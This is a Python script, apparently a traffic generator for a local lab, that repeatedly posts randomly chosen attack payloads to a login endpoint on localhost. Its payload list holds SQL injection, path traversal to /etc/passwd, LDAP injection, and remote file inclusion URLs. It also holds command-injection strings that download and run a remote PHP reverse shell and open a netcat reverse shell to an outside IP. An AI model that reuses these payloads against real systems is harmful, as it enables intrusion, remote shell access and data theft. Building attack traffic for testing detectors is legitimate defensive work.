import requests
from colorama import init, Fore
import time
import random

init(autoreset=True)

usernames = ['someuser', 'joe23', 'himynameifjjeff', 'barnacleboy23', 'alexastre2', 'mmwaoeop']
passwords = ['xmwna1MA!', 'rando239!', '8Wu!JKj2', 'wC6Ub$R#']

payloads = {
    'SQL Injection' : [
        "1' OR 1=1",
        "idk'; AND SELECT SUBSTR(users,1,1) FROM information_schema.tables='A'",
        "name=','');WAITFOR%20DELAY%20'0:0:5'"
    ],
    'Path Traversal' : [
        '....//....//....//etc/passwd',
        '%252e%252e%252fetc%252fpasswd'
    ],
    'Code Injection' : [
        '127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php',
        '127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80'
    ],
    'File Inclusion' : [
        'http://example.com/shell.php',
        'https://attacker.com/exploit.txt'
    ],
    'LDAP Injection' : [
        '(&(!(objectClass=Impresoras))(uid=s*))',
        '(&(objectClass=VALUE1)(type=Epson*))VALUE1 = *)(ObjectClass=*))(&(objectClass=void'
    ]
}

def attack():
    
    # select random payload
    randNumber = random.randint(0, 5)
    if randNumber == 0:
        payload = random.choice(payloads['SQL Injection'])
        data = {
            'username': 'someuser',
            'password': payload
        }
        url = 'http://localhost:5051/login'
    elif randNumber == 1:
        payload = random.choice(payloads['Path Traversal'])
        data = {
            'username': 'someuser',
            'password': 'xba12lM!'
        }
        url = f'http://localhost:5051/login{payload}'
    elif randNumber == 2:
        payload = random.choice(payloads['Code Injection'])
        data = {
            'username': 'someuser',
            'password': payload
        }
        url = f'http://localhost:5051/login'
    elif randNumber == 3:
        payload = random.choice(payloads['File Inclusion'])
        data = {
            'username': 'someuser',
            'password': payload
        }
        url = f'http://localhost:5051/login'
    elif randNumber == 4:
        payload = random.choice(payloads['LDAP Injection'])
        data = {
            'username': 'someuser',
            'password': payload
        }
        url = f'http://localhost:5051/login'
    else:
        data = {
            'username': random.choice(usernames),
            'password': random.choice(passwords)
        }
        url = f'http://localhost:5051/login'




    response = requests.post(url, data=data)

    print(f"{Fore.YELLOW} Sending {data} to {url}...")



if __name__ == '__main__':
    print(f"{Fore.YELLOW} Attacker running!")
    while True:
        attack()
        time.sleep(5)